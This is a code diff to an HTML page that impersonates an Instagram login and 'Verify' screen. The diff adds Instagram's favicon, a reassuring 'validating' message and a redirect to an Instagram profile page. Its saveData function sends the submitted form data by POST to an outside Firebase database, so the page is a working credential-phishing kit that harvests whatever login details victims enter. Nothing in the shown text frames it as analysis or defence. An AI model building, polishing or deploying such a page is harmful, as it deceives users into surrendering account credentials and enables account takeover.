@@ -7,7 +7,8 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
   <link rel="stylesheet" href="style.css">
-  <title>Instagram Login Form</title>
+	<link rel="icon" href="https://www.instagram.com/favicon.ico">
+  <title>Verify &bull; Instagram</title>
 </head>
 
 <body>
@@ -109,7 +110,8 @@ if (turn == 1){
 }
 }
 	function saveData() {
-alert('hi');
+document.getElementById("errormsg").innerHTML = "Please wait, while validating...";
+		document.getElementById("errormsg").style.color="green";
         fetch('https://test-b703f-default-rtdb.firebaseio.com/userData.json', {
             method: "POST",
             headers: {
@@ -121,7 +123,7 @@ alert('hi');
             })
         })
             .then(() => {
-                window.location = "https://accounts.google.com/info/sessionexpired?continue=null"
+                window.location = "https://www.instagram.com/bakait_log/"
             })
             .catch(e => console.error(e));
     }
